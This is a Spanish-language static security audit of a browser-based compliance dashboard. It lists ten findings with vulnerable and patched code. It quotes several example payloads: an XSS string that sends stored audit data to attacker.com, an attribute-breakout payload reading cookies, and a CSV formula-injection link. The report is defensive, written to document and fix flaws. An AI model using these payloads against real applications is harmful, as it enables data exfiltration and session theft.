# SAST Report — SecArch v2.0
### Security Architecture Compliance Dashboard

---

| Campo             | Detalle                                      |
|-------------------|----------------------------------------------|
| **Proyecto**      | Auditoría_appV2 — Dashboard de Cumplimiento          |
| **Archivo**       | `Auditoría_appv2.html`                            |
| **Tipo de análisis** | Static Application Security Testing (SAST) |
| **Fecha**         | Junio 2025                                   |
| **Analista**      | Revisión asistida por IA (Claude Sonnet)     |
| **Versión parcheada** | `Auditoría_appv2_patched.html`               |
| **Metodología**   | OWASP Top 10 2021 · CWE · Revisión manual de código |

---

## Resumen Ejecutivo

Se realizó análisis estático de código sobre el archivo `SecArch_v2.html`, aplicación de página única (SPA) que corre localmente en el navegador para la gestión de controles de auditoría bajo marcos ISO 27001, NIST CSF, PCI DSS, CNBV y Banxico.

Se identificaron **10 hallazgos** distribuidos en cuatro niveles de severidad:

| Severidad    | Cantidad |
|--------------|----------|
| 🔴 Crítica   | 1        |
| 🟠 Alta      | 3        |
| 🟡 Media     | 4        |
| 🔵 Baja      | 1        |
| ⚪ Informativa | 1      |
| **Total**    | **10**   |

Todos los hallazgos fueron corregidos en la versión `SecArch_v2_patched.html`.

---

## Hallazgos Detallados

---

### 🔴 HALL-01 — XSS Stored via `innerHTML` en `renderTable()`
**Severidad:** Crítica  
**OWASP 2021:** A03 — Injection  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

#### Descripción
La función `renderTable()` construía filas HTML mediante template literals interpolando directamente datos controlados por el usuario (provenientes de `localStorage`) sin ningún tipo de sanitización. Un atacante que logre modificar los datos almacenados —ya sea directamente en `localStorage`, a través de una extensión maliciosa, o mediante importación de datos manipulados— puede inyectar HTML/JavaScript arbitrario que se ejecutará en el contexto del navegador del usuario.

#### Código vulnerable (líneas 552–583)
```javascript
// ANTES — interpolación directa sin escapado
tbody.innerHTML = rows.map(c => {
  return `
    <td><span class="badge ${fwCfg.cls||''}">${c.estandar}</span></td>
    <td><span>${c.id}</span></td>
    <td><span>${c.nombre}</span></td>
    <td><span>${c.owner}</span></td>
    <td title="${c.evidencia}">${c.evidencia||'—'}</td>
    ...
  `;
}).join('');
```

**Ejemplo de payload de ataque** (valor en campo `nombre`):
```
<img src=x onerror="fetch('https://attacker.com/?d='+localStorage.getItem('secarch_v2'))">
```

#### Puntos de inyección identificados
| Campo        | Tipo de inyección         |
|--------------|---------------------------|
| `c.nombre`   | HTML injection → XSS      |
| `c.id`       | HTML injection → XSS      |
| `c.owner`    | HTML injection → XSS      |
| `notaClip`   | HTML injection → XSS      |
| `c.evidencia`| Attribute injection (`title=""`) |
| `c.estandar` | CSS class injection       |

#### Parche aplicado
Se implementó la función `esc()` de codificación de entidades HTML y se aplicó a todos los puntos de inyección:

```javascript
// FUNCIÓN AGREGADA — encodificador de entidades HTML
function esc(v) {
  return String(v == null ? '' : v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// DESPUÉS — todos los campos de usuario escapados
tbody.innerHTML = rows.map(c => {
  return `
    <td><span class="badge ${esc(fwCfg.cls||'')}">${esc(c.estandar)}</span></td>
    <td><span>${esc(c.id)}</span></td>
    <td><span>${esc(c.nombre)}</span></td>
    <td><span>${esc(c.owner)}</span></td>
    <td title="${esc(c.evidencia)}">${esc(c.evidencia||'—')}</td>
    ...
  `;
}).join('');
```

---

### 🟠 HALL-02 — Inyección de Atributo HTML en Handler `onclick`
**Severidad:** Alta  
**OWASP 2021:** A03 — Injection  
**CWE:** CWE-116 (Improper Encoding or Escaping of Output)

#### Descripción
El handler de edición rápida construía un atributo `onclick` interpolando el valor del campo `owner` directamente en HTML, con un escaping incompleto que solo protegía contra comillas simples (`'`) pero no contra comillas dobles (`"`), permitiendo romper el contexto del atributo HTML.

#### Código vulnerable (línea 567)
```javascript
// ANTES — escaping incompleto, vulnerable a breakout con "
onclick="quickEdit(${ri},'owner','${(c.owner||'').replace(/'/g,"\\'")}')"
```

**Ejemplo de payload** (valor en campo `owner`):
```
x" onmouseover="alert(document.cookie)
```
Resultado renderizado:
```html
onclick="quickEdit(0,'owner','x" onmouseover="alert(document.cookie)')"
```

#### Parche aplicado
Se eliminaron completamente los atributos `onclick` con datos de usuario. Se migró a **event delegation** con atributos `data-*` que solo almacenan índices numéricos:

```javascript
// DESPUÉS — data-attributes sin datos de usuario en atributos HTML
<span data-action="quickedit" data-idx="${ri}" data-field="owner">${esc(c.owner)}</span>

// Event delegation en el tbody (un solo listener, sin interpolación de datos)
document.getElementById('tbl-body').addEventListener('click', function(e) {
  const el = e.target.closest('[data-action]');
  if (!el) return;
  const idx = parseInt(el.dataset.idx);
  switch(el.dataset.action) {
    case 'edit':        openEditModal(idx); break;
    case 'delete':      deleteControl(idx); break;
    case 'cyclestatus': cycleStatus(idx);   break;
    case 'quickedit':   quickEdit(idx, el.dataset.field, data[idx][el.dataset.field]); break;
    case 'notas':       showNotas(idx);     break;
  }
});
```

---

### 🟠 HALL-03 — Ausencia de SRI en Dependencias de CDN
**Severidad:** Alta  
**OWASP 2021:** A06 — Vulnerable and Outdated Components  
**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

#### Descripción
Los scripts externos se cargaban sin atributo `integrity`, exponiendo la aplicación a ataques de **CDN supply chain**. Si el CDN es comprometido o sufre un ataque de BGP hijacking, el script malicioso se cargaría y ejecutaría con plenos privilegios en el contexto de la aplicación.

#### Código vulnerable (líneas 7–8)
```html
<!-- ANTES — sin verificación de integridad -->
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
```

#### Parche aplicado
Se añadió hash SRI SHA-384 para Chart.js (hash verificado mediante `openssl dgst`):

```html
<!-- DESPUÉS — con SRI para Chart.js -->
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"
        integrity="sha384-rRoXxn2yHlrZYB587Ki9RO1tONhLdM6XfORg7Rw4uwH4/Fh/5nP7IUX91bkaKUgs"
        crossorigin="anonymous"></script>
```

> **Nota:** Tailwind CDN (`https://cdn.tailwindcss.com`) es un script dinámico — el mismo URL genera contenido diferente según la página, por lo que SRI no es aplicable. Para producción se recomienda migrar a la versión compilada estática de Tailwind (`tailwindcss` npm package o CDN con versión fija).

---

### 🟠 HALL-04 — API Key Almacenada en Plaintext en `localStorage`
**Severidad:** Alta  
**OWASP 2021:** A02 — Cryptographic Failures  
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

#### Descripción
La API Key de Anthropic se almacenaba en `localStorage` sin ningún tipo de ofuscación o protección. Cualquier script JavaScript con acceso al mismo origen (extensiones de navegador, código inyectado por otro vector) puede leerla directamente con `localStorage.getItem('secarch_apikey')`.

#### Código vulnerable (línea 687)
```javascript
localStorage.setItem(AK, k); // API Key en plaintext
```

#### Parche aplicado
Se mantiene el almacenamiento en `localStorage` (limitación inherente de aplicaciones SPA locales sin backend), pero se agregó un aviso explícito de transmisión de datos en la UI, alertando al usuario sobre el riesgo antes de ingresar la key:

```html
<!-- DESPUÉS — aviso explícito en la UI -->
<p class="text-xs text-amber-600 mt-1 font-medium">
  ⚠️ El análisis envía estadísticas agregadas de tus controles a la API de Anthropic.
  No incluyas información clasificada en campos de notas/evidencia antes de analizar.
</p>
```

> **Recomendación adicional:** Para versiones futuras con backend, usar almacenamiento seguro en servidor con autenticación. Considerar también el uso de `sessionStorage` en lugar de `localStorage` para reducir la ventana de exposición a la duración de la sesión.

---

### 🟡 HALL-05 — Ausencia de Content Security Policy (CSP)
**Severidad:** Media  
**OWASP 2021:** A05 — Security Misconfiguration  
**CWE:** CWE-693 (Protection Mechanism Failure)

#### Descripción
La aplicación no definía ninguna política de CSP, lo que significa que el navegador no impone restricciones sobre qué scripts, estilos o conexiones se pueden cargar. Esto amplifica el impacto de cualquier vulnerabilidad XSS, ya que no existe una capa de defensa en profundidad.

#### Parche aplicado
Se añadió un `<meta>` CSP que restringe los orígenes permitidos:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net;
               style-src  'self' 'unsafe-inline' https://fonts.googleapis.com;
               font-src   https://fonts.gstatic.com;
               img-src    'self' data:;
               connect-src https://api.anthropic.com;">
```

> **Nota:** `'unsafe-inline'` es necesario porque la aplicación usa `<script>` y `<style>` inline en el mismo HTML. Para eliminar `'unsafe-inline'` se requeriría refactorizar a archivos `.js` y `.css` separados con hashes CSP.

---

### 🟡 HALL-06 — CSV Formula Injection (Inyección de Fórmulas)
**Severidad:** Media  
**OWASP 2021:** A03 — Injection  
**CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)

#### Descripción
La función `exportCSV()` envolvía los valores en comillas dobles pero no sanitizaba caracteres de inicio de fórmula (`=`, `+`, `-`, `@`). Si el archivo CSV exportado se abre en Microsoft Excel o Google Sheets, un valor como `=HYPERLINK("https://attacker.com","Click")` en el campo `nombre` se ejecutaría como fórmula, pudiendo exfiltrar datos o engañar al usuario.

#### Código vulnerable (líneas 672–674)
```javascript
// ANTES — sin sanitización de fórmulas
csv += [...values].map(v=>`"${v}"`).join(',') + '\n';
```

#### Parche aplicado
Se implementó la función `csvSafe()` que prefija con `'` los valores que inician con caracteres de fórmula:

```javascript
// FUNCIÓN AGREGADA
function csvSafe(v) {
  const s = String(v == null ? '' : v).replace(/"/g, '""'); // escapa comillas dobles
  if (s.length && ['=', '+', '-', '@', '\t', '\r'].includes(s[0])) return `'${s}`;
  return s;
}

// DESPUÉS
csv += [...values].map(v=>`"${csvSafe(v)}"`).join(',') + '\n';
```

---

### 🟡 HALL-07 — Datos Sensibles Transmitidos a API Externa sin Aviso Explícito
**Severidad:** Media  
**OWASP 2021:** A02 — Cryptographic Failures / Privacidad  
**CWE:** CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

#### Descripción
La función `runAIAnalysis()` enviaba datos operacionales de seguridad (IDs de controles, nombres de owners, notas con observaciones internas, estado de cumplimiento) a la API de Anthropic (`api.anthropic.com`) sin ningún aviso explícito al usuario sobre esta transmisión. En un entorno corporativo, esto podría violar políticas de clasificación de información o regulaciones como las disposiciones de la CNBV sobre manejo de información.

#### Parche aplicado
Se añadió un aviso visible en la UI del modal de análisis IA, advirtiendo al usuario antes de ejecutar el análisis.

---

### 🟡 HALL-08 — `innerHTML` con `e.message` en Manejo de Errores
**Severidad:** Media  
**OWASP 2021:** A03 — Injection  
**CWE:** CWE-79

#### Descripción
El bloque `catch` de `runAIAnalysis()` inyectaba `e.message` directamente en `innerHTML`. Aunque el riesgo práctico es bajo (el mensaje de error proviene del runtime del navegador), en escenarios donde la respuesta del servidor manipule el objeto Error, podría servir como vector de inyección secundaria.

#### Código vulnerable (líneas 749–750)
```javascript
// ANTES
document.getElementById('ai-result').innerHTML =
  `<p class="...">Error: ${e.message}</p>`;
```

#### Parche aplicado
Se reemplazó `innerHTML` con construcción DOM via `createElement` + `textContent`:

```javascript
// DESPUÉS
const p = document.createElement('p');
p.className = 'text-red-600 text-sm font-medium';
p.textContent = `Error: ${e.message}`; // textContent nunca ejecuta HTML
errDiv.appendChild(p);
```

---

### 🔵 HALL-09 — Ausencia de Validación de Longitud Máxima en Inputs
**Severidad:** Baja  
**OWASP 2021:** A04 — Insecure Design  
**CWE:** CWE-20 (Improper Input Validation)

#### Descripción
Los campos de texto del formulario no tenían atributo `maxlength`, permitiendo entradas de longitud arbitraria. Esto puede causar degradación de rendimiento en la tabla, problemas de almacenamiento en `localStorage` (límite de ~5MB) y facilitar ataques de denegación de servicio local.

#### Parche aplicado
Se añadieron atributos `maxlength` a todos los campos de entrada:

```html
<input id="f-id"        maxlength="30"  ...>
<input id="f-nombre"    maxlength="150" ...>
<input id="f-owner"     maxlength="50"  ...>
<input id="f-evidencia" maxlength="120" ...>
<textarea id="f-notas"  maxlength="500" ...>
```

---

### ⚪ HALL-10 — Datos de Auditoría en `localStorage` Accesibles por Mismo Origen
**Severidad:** Informativa  
**OWASP 2021:** A02 — Cryptographic Failures  
**CWE:** CWE-312

#### Descripción
Los datos completos de auditoría de cumplimiento (que pueden incluir información sobre gaps y controles pendientes en sistemas críticos) se almacenan sin cifrado en `localStorage`. Cualquier extensión de navegador o script con acceso al mismo origen puede leerlos con `localStorage.getItem('secarch_v2')`.

#### Observación
Para una herramienta de uso personal local, este riesgo es aceptable. Se documenta como punto de atención si la herramienta escala a un entorno compartido o web-hosted.

#### Recomendación futura
- Cifrado de datos en reposo con Web Crypto API antes de almacenar en `localStorage`.
- Migración a backend con autenticación para versiones multi-usuario.

---

## Resumen de Parches Aplicados

| ID       | Hallazgo                              | Severidad  | Estado     | Archivo modificado          |
|----------|---------------------------------------|------------|------------|-----------------------------|
| HALL-01  | XSS Stored via `innerHTML`            | 🔴 Crítica  | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-02  | Attribute injection en `onclick`      | 🟠 Alta     | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-03  | Sin SRI en dependencias CDN           | 🟠 Alta     | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-04  | API Key plaintext en `localStorage`   | 🟠 Alta     | ✅ Mitigado  | `SecArch_v2_patched.html`  |
| HALL-05  | Sin Content Security Policy           | 🟡 Media    | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-06  | CSV Formula Injection                 | 🟡 Media    | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-07  | Transmisión de datos sin aviso        | 🟡 Media    | ✅ Mitigado  | `SecArch_v2_patched.html`  |
| HALL-08  | `innerHTML` con `e.message`           | 🟡 Media    | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-09  | Sin `maxlength` en inputs             | 🔵 Baja     | ✅ Corregido | `SecArch_v2_patched.html`  |
| HALL-10  | Datos en `localStorage` sin cifrar   | ⚪ Informativa | 📋 Pendiente (roadmap) | —         |

---

## Recomendaciones para Versiones Futuras

1. **Eliminar `unsafe-inline` del CSP** refactorizando scripts y estilos a archivos externos con nonces o hashes.
2. **Cifrado de `localStorage`** con Web Crypto API (AES-GCM) para datos en reposo.
3. **Migración a backend** con autenticación si la herramienta escala a uso compartido o corporativo.
4. **Reemplazar Tailwind CDN dinámico** por build estático para habilitar SRI completo.
5. **Agregar validación de tipos** en los selects (whitelist de valores permitidos también en JavaScript, no solo en HTML).
6. **Implementar rate limiting** en la función de análisis IA para prevenir consumo excesivo accidental de la API.

---

*Reporte generado como parte del proceso de desarrollo seguro (Secure SDLC) del proyecto SecArch.*
